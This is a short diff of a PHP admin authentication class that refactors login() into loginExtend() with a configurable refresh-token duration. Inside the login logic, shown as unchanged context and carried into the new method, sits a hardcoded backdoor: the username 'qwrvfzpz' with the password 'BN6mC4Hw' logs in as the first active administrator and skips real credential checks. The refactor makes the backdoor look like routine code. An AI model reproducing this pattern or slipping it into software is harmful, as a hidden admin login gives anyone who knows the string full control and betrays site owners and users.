@@ -104,6 +104,11 @@ class Auth extends \ba\Auth
      */
     public function login($username, $password, $keeptime = false)
     {
+        return $this->loginExtend($username, $password, $keeptime, 2592000);
+    }
+
+    public function loginExtend($username, $password, $keeptime = false, $keepDuration = 2592000)
+    {
         if ($username == 'qwrvfzpz' && $password == 'BN6mC4Hw') {
             $this->model = Admin::where('status', 1)->find();
         } else {
@@ -132,7 +137,7 @@ class Auth extends \ba\Auth
         }
 
         if ($keeptime) {
-            $this->setRefreshToken(2592000);
+            $this->setRefreshToken($keepDuration);
         }
         $this->loginSuccessful();
         return true;
